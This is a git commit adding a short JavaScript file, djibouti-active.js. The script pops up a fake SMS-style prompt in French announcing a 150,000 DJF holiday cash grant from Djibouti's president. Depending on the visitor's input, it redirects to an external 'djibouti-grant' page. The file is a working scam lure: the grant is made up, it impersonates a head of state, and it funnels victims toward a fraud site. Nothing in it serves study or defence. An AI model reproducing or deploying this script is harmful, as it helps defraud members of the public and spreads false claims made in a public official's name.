e42acc3a7024ee98ff073370da2fe114d253a171
boss-bloq <nsisboy01@gmail.com>
2024-12-23 22:13:05 -0800

    Create djibouti-active.js

---
+++ djibouti-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 150 000DJF'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention en espèces de Noël et nouvel an de 150 000 DJF du Président ISMAIL OMAR GUELLEH aux DJIBOUTIENS. Veuillez appuyer sur OK pour récupérer le prix en espèces.   ','RETIRER 150 000DJF');
+if (password != 'RETIRER 150 000DJF') {
+location.href='https://damba-fest.org/djibouti-grant.html';
+}
